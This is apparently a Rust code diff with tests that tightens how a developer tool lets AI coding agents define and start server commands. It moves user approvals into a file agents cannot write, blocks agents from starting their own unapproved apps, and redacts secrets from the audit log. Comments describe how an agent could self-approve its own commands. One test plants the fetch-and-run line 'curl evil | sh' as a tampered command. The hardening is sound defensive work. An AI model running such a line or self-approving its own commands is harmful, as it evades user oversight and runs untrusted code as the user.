@@ -11,7 +11,7 @@
 //!               "servers": {
 //!                 "api": { "cmd": "uv run app serve --port 8765", "port": 8765 },
 //!                 "web": { "cmd": "uv run app frontend --port 8766", "port": 8766, "after": ["api"] } },
-//!               "origin": { "by": "agent:claude-3", "at": 1795000000 }, "approved": "…" } } }
+//!               "origin": { "by": "agent:claude-3", "at": 1795000000 } } } }
 //! ```
 //!
 //! `cmd` is run by the user's shell in a PTY (`pty`), in `cwd` (inside the project), with `env`
@@ -22,13 +22,21 @@
 //! something else has it (another project's server, an older run): the server is not started,
 //! and says `port-taken`.
 //!
-//! An app is a command nib keeps and runs later, so it must not be a way in: an app
-//! defined by anybody but the user (an agent, `nib ctl`) waits for the user's approval of its
-//! exact definition (`approved` is its hash, set only by `AppOp::Approve` from the user), and
-//! any change takes the approval away. The user's requests start only approved apps; an agent
-//! may start the app it defined itself (its harness already let it run that command), nothing
-//! else does. Agents' requests carry their session's token (`tokens`): a request without one
-//! is refused. Every change is written to `$NIBDIR/apps.log.jsonl`.
+//! An app is a command nib keeps and runs later, as the user and outside any agent's sandbox,
+//! so it must not be a way in: an app defined by anybody but the user (an agent, `nib ctl`)
+//! waits for the user's approval of its exact definition, and any change takes the approval
+//! away. Nobody starts an app that is not approved, the agent that defined it included.
+//!
+//! What the user approved is not kept in `apps.json`: agents may write `$NIBDIR`, and one that
+//! could write the approval beside the definition would approve for the user. It is kept in a
+//! file of the daemon's own, outside everything an agent is given to write
+//! (`places::approvals`): app name → the hash of the definition approved, set only by
+//! `AppOp::Approve` from the user. An `approved` in `apps.json` (written before v0.4) means
+//! nothing and is dropped. `origin` only says who wrote the definition; it lets nobody do
+//! anything.
+//!
+//! Agents' requests carry their session's token (`tokens`): a request without one is refused.
+//! Every change is written to `$NIBDIR/apps.log.jsonl`.
 //!
 //! The window asks with `Request::App` and hears of every change as `ServerNotify::App`.
 //! Agents ask with `nib-app …` (`nibd app …`, see `cli`): a short-lived process, so it leaves
@@ -64,15 +72,17 @@ pub type Apps = BTreeMap<String, Stored>;
 type Defs = BTreeMap<String, ServerDef>;
 pub type Shared = Arc<Mutex<Servers>>;
 
-/// An app as `apps.json` keeps it: its definition, who made it, and the user's approval.
+/// An app as `apps.json` keeps it (its definition, who made it), and the user's approval,
+/// which is kept elsewhere (`Servers::approvals`).
 #[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq)]
 pub struct Stored {
     #[serde(flatten)]
     pub def: AppDef,
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub origin: Option<AppOrigin>,
-    /// The hash of the definition the user approved.
-    #[serde(default, skip_serializing_if = "Option::is_none")]
+    /// The hash of the definition the user approved. Never read from `apps.json` or written
+    /// to it.
+    #[serde(skip)]
     pub approved: Option<String>,
 }
 
@@ -207,7 +217,11 @@ pub struct Servers {
     root: PathBuf,
     /// `$NIBDIR/apps.json` (`None`: no NIBDIR on this machine).
     file: Option<PathBuf>,
-    /// Where agents leave their requests (`<mailbox>/app`; made by the first one that asks).
+    /// What the user approved: `{ "approved": { app: hash } }`, in a file no agent is given to
+    /// write (`None`: nowhere to keep it, so nothing is approved).
+    approvals: Option<PathBuf>,
+    /// The session's mailbox folder: each agent leaves its requests in its own part of it
+    /// (`mail::own`, `app/`).
     dir: PathBuf,
     /// What every terminal gets: `NIB_SCRATCH`, `NIBDIR`.
     env: Vec<(&'static str, PathBuf)>,
@@ -220,13 +234,13 @@ pub struct Servers {
 
 /// The apps of the project at `root`, and the thread that looks after them for as long as
 /// they are kept.
-pub fn new(root: &Path, nibdir: Option<&Path>, scratch: Option<&Path>, mailbox: &Path, ptys: Arc<Mutex<Ptys>>, tx: Sender<ServerMsg>) -> Shared {
-    let dir = mailbox.join("app");
+pub fn new(root: &Path, nibdir: Option<&Path>, approvals: Option<PathBuf>, scratch: Option<&Path>, mailbox: &Path, ptys: Arc<Mutex<Ptys>>, tx: Sender<ServerMsg>) -> Shared {
+    let dir = mailbox.to_path_buf();
     let mut env = Vec::new();
     env.extend(scratch.map(|p| ("NIB_SCRATCH", p.to_path_buf())));
     env.extend(nibdir.map(|p| ("NIBDIR", p.to_path_buf())));
     let shared = Arc::new_cyclic(|me| {
-        Mutex::new(Servers { root: root.to_path_buf(), file: nibdir.map(|d| d.join("apps.json")), dir, env, ptys, tx, runs: BTreeMap::new(), me: me.clone() })
+        Mutex::new(Servers { root: root.to_path_buf(), file: nibdir.map(|d| d.join("apps.json")), approvals, dir, env, ptys, tx, runs: BTreeMap::new(), me: me.clone() })
     });
     let weak = Arc::downgrade(&shared);
     thread::spawn(move || loop {
@@ -415,8 +429,8 @@ pub fn read(file: &Path) -> Result<Apps, String> {
         let def = parse_def(name, &bare).map_err(wrong)?;
         validate(name, &def).map_err(wrong)?;
         let origin = a.get("origin").map(|o| serde_json::from_value(o.clone())).transpose().map_err(|e| wrong(format!("{name}: origin: {e}")))?;
-        let approved = a.get("approved").and_then(Value::as_str).map(str::to_string);
-        out.insert(name.clone(), Stored { def, origin, approved });
+        // An `approved` here is anybody's who can write the file: not the user's word.
+        out.insert(name.clone(), Stored { def, origin, approved: None });
     }
     Ok(out)
 }
@@ -439,14 +453,18 @@ fn flat(apps: &Apps) -> Defs {
     out
 }
 
-/// May `who` start `app` as it is defined now? The message says why not.
+/// May `who` start `app` as it is defined now? Only an app the user approved as it is,
+/// whoever asks: the agent that defined it runs in a sandbox or asks before each command, and
+/// an app's commands do neither. The message says why not.
 fn may_run(who: &Who, app: &str, st: &Stored) -> Result<(), String> {
     if st.approved.as_deref() == Some(hash(&st.def).as_str()) {
         return Ok(());
     }
     let by = st.origin.as_ref().map_or("somebody", |o| o.by.as_str());
     match who {
-        Who::Agent(_) if st.origin.as_ref().is_some_and(|o| o.by == who.by()) => Ok(()),
+        Who::Agent(_) if st.origin.as_ref().is_some_and(|o| o.by == who.by()) => {
+            Err(format!("{app} waits for the user's approval: you defined it, and they see its commands and approve them the first time they open it from the Apps panel. Ask them to open it; you cannot start it before"))
+        }
         Who::User => Err(format!("{app} is not approved yet (defined by {by}): open it from the Apps panel to see its commands and approve them")),
         _ => Err(format!("{app} waits for the user's approval (defined by {by}): they see its commands and approve them the first time they open it from the Apps panel")),
     }
@@ -457,18 +475,60 @@ impl Servers {
         self.file.as_deref().ok_or_else(|| "no NIBDIR on this machine to keep apps.json in (see the daemon log)".to_string())
     }
 
+    /// The apps as `apps.json` has them, each with the user's approval if there is one.
     fn apps(&self) -> Result<Apps, String> {
-        read(self.file()?)
+        let mut apps = read(self.file()?)?;
+        let approved = self.approved();
+        for (name, st) in &mut apps {
+            st.approved = approved.get(name).cloned();
+        }
+        Ok(apps)
     }
 
+    /// App name → the hash of the definition the user approved.
+    fn approved(&self) -> BTreeMap<String, String> {
+        let read = |f: &PathBuf| serde_json::from_slice::<Value>(&fs::read(f).ok()?).ok()?.get("approved").cloned();
+        self.approvals.as_ref().and_then(read).and_then(|v| serde_json::from_value(v).ok()).unwrap_or_default()
+    }
+
+    /// Write the definitions to `apps.json`, and the approvals to their own file. The approvals
+    /// first: if only that is written, an approval is of a definition that is not there, which
+    /// approves nothing.
     fn save(&self, apps: &Apps) -> Result<(), String> {
-        write(self.file()?, apps).map_err(|e| format!("writing apps.json: {e}"))
+        let file = self.file()?;
+        let approved: BTreeMap<&String, &String> = apps.iter().filter_map(|(n, st)| Some((n, st.approved.as_ref()?))).collect();
+        if let Some(f) = &self.approvals {
+            let keep = || {
+                if let Some(dir) = f.parent() {
+                    crate::places::private_dir(dir)?;
+                }
+                crate::fs_ops::write_whole(f, serde_json::to_string_pretty(&json!({ "approved": approved }))? + "\n")
+            };
+            // With nothing approved before or now, there is nothing to keep.
+            if !(approved.is_empty() && !f.exists()) {
+                keep().map_err(|e: std::io::Error| format!("writing {}: {e}", f.display()))?;
+            }
+        } else if !approved.is_empty() {
+            return Err("nowhere on this machine to keep what you approve (see the daemon log)".into());
+        }
+        write(file, apps).map_err(|e| format!("writing apps.json: {e}"))
     }
 
-    /// One line in `$NIBDIR/apps.log.jsonl`: who did what to which app.
+    /// One line in `$NIBDIR/apps.log.jsonl`: who did what to which app. The definition is
+    /// there with its hash (what an approval is of) and its variables by name only: a log
+    /// keeps what `apps.json` no longer has, and a variable's value may be a key.
     fn audit(&self, who: &Who, did: &str, app: &str, def: Option<&AppDef>) {
         let Some(file) = self.file.as_ref().map(|f| f.with_file_name("apps.log.jsonl")) else { return };
-        let line = json!({ "at": now(), "by": who.by(), "did": did, "app": app, "def": def });
+        let shown = def.map(|d| {
+            let mut v = serde_json::to_value(d).unwrap_or_default();
+            for s in v.get_mut("servers").and_then(Value::as_object_mut).into_iter().flat_map(|m| m.values_mut()) {
+                if let Some(env) = s.get_mut("env").filter(|e| e.is_object()) {
+                    *env = json!(env.as_object().map(|m| m.keys().cloned().collect::<Vec<_>>()));
+                }
+            }
+            v
+        });
+        let line = json!({ "at": now(), "by": who.by(), "did": did, "app": app, "hash": def.map(hash), "def": shown });
         if let Ok(mut f) = fs::OpenOptions::new().create(true).append(true).open(file) {
             let _ = writeln!(f, "{line}");
         }
@@ -805,18 +865,18 @@ impl Servers {
         Some(all[all.len().saturating_sub(lines)..].join("\n"))
     }
 
-    /// Answer the requests agents left (`cli`), oldest first. One without the token of an
-    /// agent nib started is refused.
+    /// Answer the requests agents left (`cli`), oldest first. One without the token of the
+    /// agent in whose folder it was left is refused.
     fn agents(&mut self) {
         let dir = self.dir.clone();
-        let taken = crate::rpc::take(&dir);
+        let taken = crate::rpc::take_all(&dir, "app");
         if taken.is_empty() {
             return;
         }
-        for (name, req) in taken {
-            let req = req.unwrap_or_default();
+        for asked in taken {
+            let req = asked.req.clone().unwrap_or_default();
             let args: Vec<String> = serde_json::from_value(req["args"].clone()).unwrap_or_default();
-            let (out, code) = match crate::tokens::who(req["token"].as_str().unwrap_or_default()) {
+            let (out, code) = match asked.asker(req["token"].as_str().unwrap_or_default()) {
                 Some(agent) => self.run(&args, &Who::Agent(agent)),
                 None => {
                     let msg = format!("refused a request for the apps without an agent's token: {}", args.join(" "));
@@ -824,10 +884,10 @@ impl Servers {
                     ("nib-app: refused: the request does not come from an agent nib started (no valid $NIB_TOKEN)".to_string(), 1)
                 }
             };
-            crate::rpc::answer(&dir, &name, &json!({ "out": out, "code": code }).to_string());
+            crate::rpc::answer(&asked.dir, &asked.name, &json!({ "out": out, "code": code }).to_string());
         }
         // What nobody came for (a command that gave up, or was stopped).
-        crate::rpc::sweep(&dir);
+        crate::rpc::sweep_all(&dir, "app");
     }
 
     /// The server of `app` that `log` means when none is named: its page's, else its first.
@@ -992,7 +1052,7 @@ pub fn cli(args: &[String]) -> i32 {
         return code;
     }
     let Some(dir) = crate::cli::rpc_dir("app") else {
-        eprintln!("nib-app: only works inside an agent that nib started (NIB_MAILBOX is not set, or holds no outbox/)");
+        eprintln!("nib-app: only works inside an agent that nib started (NIB_MAILBOX and NIB_AGENT are not set, or name no folder of this agent's own)");
         return 2;
     };
     crate::tokens::private(&dir);
@@ -1258,7 +1318,7 @@ mod tests {
             fs::create_dir_all(d.join(sub)).unwrap();
         }
         let (tx, rx) = mpsc::channel();
-        (new(&d.join("root"), Some(&d.join("nibdir")), None, &d.join("mailbox"), Default::default(), tx), rx, d)
+        (new(&d.join("root"), Some(&d.join("nibdir")), Some(d.join("private/approvals.json")), None, &d.join("mailbox"), Default::default(), tx), rx, d)
     }
 
     fn info(s: &Shared, name: &str) -> AppInfo {
@@ -1309,25 +1369,71 @@ mod tests {
         // The user's own definition needs no second look.
         act(AppOp::Set { name: "mine".into(), def: job.clone() }, &Who::User).unwrap();
         assert!(info(&s, "mine").approved);
+        // What was approved is not in apps.json, which agents may write: writing it there
+        // approves nothing, and what is there from before v0.4 is dropped at the next change.
+        let file = d.join("nibdir/apps.json");
+        assert!(!fs::read_to_string(&file).unwrap().contains("approved"));
+        let mut v: Value = serde_json::from_slice(&fs::read(&file).unwrap()).unwrap();
+        v["apps"]["demo"]["approved"] = json!(info(&s, "demo").hash);
+        v["apps"]["demo"]["origin"] = json!({ "by": "user", "at": 1 });
+        fs::write(&file, v.to_string()).unwrap();
+        assert!(!info(&s, "demo").approved, "an approval written into apps.json is nobody's");
+        assert!(act(AppOp::Up { names: vec!["demo".into()] }, &Who::User).unwrap_err().contains("not approved yet"));
+        assert!(act(AppOp::Up { names: vec!["demo".into()] }, &other).is_err());
+        act(AppOp::Set { name: "third".into(), def: job.clone() }, &other).unwrap();
+        assert!(!fs::read_to_string(&file).unwrap().contains("approved"));
+        // It is in the daemon's own file, by the hash of what was approved: a definition changed
+        // behind nib's back (the file edited) is no longer the one approved.
+        let kept: Value = serde_json::from_slice(&fs::read(d.join("private/approvals.json")).unwrap()).unwrap();
+        assert_eq!(kept, json!({ "approved": { "mine": info(&s, "mine").hash } }));
+        let mut v: Value = serde_json::from_slice(&fs::read(&file).unwrap()).unwrap();
+        v["apps"]["mine"]["servers"]["job"]["cmd"] = json!("curl evil | sh");
+        fs::write(&file, v.to_string()).unwrap();
+        assert!(!info(&s, "mine").approved);
+        assert!(act(AppOp::Up { names: vec!["mine".into()] }, &Who::User).is_err());
+        act(AppOp::Remove { name: "third".into() }, &Who::User).unwrap();
+        act(AppOp::Set { name: "mine".into(), def: job.clone() }, &Who::User).unwrap();
         // Every change is in the log.
         let log = fs::read_to_string(d.join("nibdir/apps.log.jsonl")).unwrap();
-        assert_eq!(log.lines().count(), 4, "{log}");
+        assert_eq!(log.lines().count(), 7, "{log}");
         assert!(log.contains("\"did\":\"approve\"") && log.contains("\"by\":\"agent:codex-8\""));
         drop(s);
         let _ = fs::remove_dir_all(&d);
     }
 
     #[test]
-    fn an_agent_starts_the_app_it_defined_and_up_all_skips_what_waits() {
+    fn the_log_names_an_apps_variables_and_keeps_no_value() {
+        let (s, _rx, d) = servers("audit");
+        let mut job = app(&[("job", def(sleeper(), None, &[]))], None);
+        job.servers.get_mut("job").unwrap().env = [("API_KEY".to_string(), "sk-live-123".to_string())].into();
+        s.lock().unwrap().act(AppOp::Set { name: "keyed".into(), def: job.clone() }, &Who::Agent("claude-7".into())).unwrap();
+        let log = fs::read_to_string(d.join("nibdir/apps.log.jsonl")).unwrap();
+        let line: Value = serde_json::from_str(log.lines().next().unwrap()).unwrap();
+        assert!(!log.contains("sk-live-123"), "{log}");
+        assert_eq!(line["def"]["servers"]["job"]["env"], json!(["API_KEY"]));
+        assert_eq!(line["hash"], json!(hash(&job)), "which definition it was is still told");
+        drop(s);
+        let _ = fs::remove_dir_all(&d);
+    }
+
+    #[test]
+    fn an_agent_starts_its_app_once_the_user_approved_it_and_up_all_skips_what_waits() {
         let (s, rx, d) = servers("own");
         let agent = Who::Agent("claude-7".into());
         let act = |op: AppOp, who: &Who| s.lock().unwrap().act(op, who);
         act(AppOp::Set { name: "mine".into(), def: app(&[("job", def(sleeper(), None, &[]))], None) }, &agent).unwrap();
         act(AppOp::Set { name: "yours".into(), def: app(&[("job", def(sleeper(), None, &[]))], None) }, &Who::User).unwrap();
-        act(AppOp::Up { names: vec!["mine".into()] }, &agent).unwrap();
-        until("mine to run", || state_of(&s, "mine", "job") == ServerState::Ready);
-        act(AppOp::Down { names: vec![] }, &Who::User).unwrap();
+        // Not the app it defined itself either: its commands run as the user, outside whatever
+        // holds the agent, so the user sees them first.
+        for op in [AppOp::Up { names: vec!["mine".into()] }, AppOp::Restart { name: "mine".into(), server: None }] {
+            assert!(act(op, &agent).unwrap_err().contains("you defined it"));
+        }
         assert_eq!(state_of(&s, "mine", "job"), ServerState::Stopped);
+        // What the user approved, an agent starts too.
+        act(AppOp::Up { names: vec!["yours".into()] }, &agent).unwrap();
+        until("yours to run", || state_of(&s, "yours", "job") == ServerState::Ready);
+        act(AppOp::Down { names: vec![] }, &Who::User).unwrap();
+        assert_eq!(state_of(&s, "yours", "job"), ServerState::Stopped);
         // The user's "start everything" starts what they approved, and says what it left.
         act(AppOp::Up { names: vec![] }, &Who::User).unwrap();
         until("yours to run", || state_of(&s, "yours", "job") == ServerState::Ready);
@@ -1342,9 +1448,7 @@ mod tests {
     #[test]
     fn an_agent_asks_through_the_mailbox_with_its_token() {
         let (s, _rx, d) = servers("agent");
-        let dir = d.join("mailbox/app");
-        fs::create_dir_all(dir.join("req")).unwrap();
-        fs::create_dir_all(dir.join("res")).unwrap();
+        let dir = crate::mail::make_own(&d.join("mailbox"), "claude-test-mailbox").unwrap().join("app");
         let token = crate::tokens::issue("claude-test-mailbox");
         let args = |a: &[&str]| a.iter().map(|s| s.to_string()).collect::<Vec<_>>();
         let json = format!(r#"{{ "title": "Job", "servers": {{ "job": {{ "cmd": "echo agent says hi & {}" }} }} }}"#, sleeper());
@@ -1358,7 +1462,15 @@ mod tests {
             assert!(code == 1 && out.contains("refused"), "{out}");
         }
         assert_eq!(state_of(&s, "job", "job"), ServerState::Stopped);
-        // With it, the agent starts what it defined.
+        // Nor with another agent's token, which it may have read: a request is its folder's agent's.
+        let theirs = crate::tokens::issue("codex-test-mailbox-other");
+        let (out, code) = ask(&dir, &theirs, &args(&["list"]));
+        assert!(code == 1 && out.contains("refused"), "{out}");
+        // With its own it asks, but starts nothing the user has not approved, its own app included.
+        let (out, code) = ask(&dir, &token, &args(&["open", "job"]));
+        assert!(code == 1 && out.contains("waits for the user's approval: you defined it"), "{out}");
+        let shown = info(&s, "job").hash;
+        s.lock().unwrap().request(AppOp::Approve { name: "job".into(), hash: shown }, true).unwrap();
         let (out, code) = ask(&dir, &token, &args(&["open", "job"]));
         assert!(code == 0 && out.starts_with("job  \"Job\""), "{out}");
         until("settled", || ask(&dir, &token, &args(&["settled", "job"])).1 == 0);
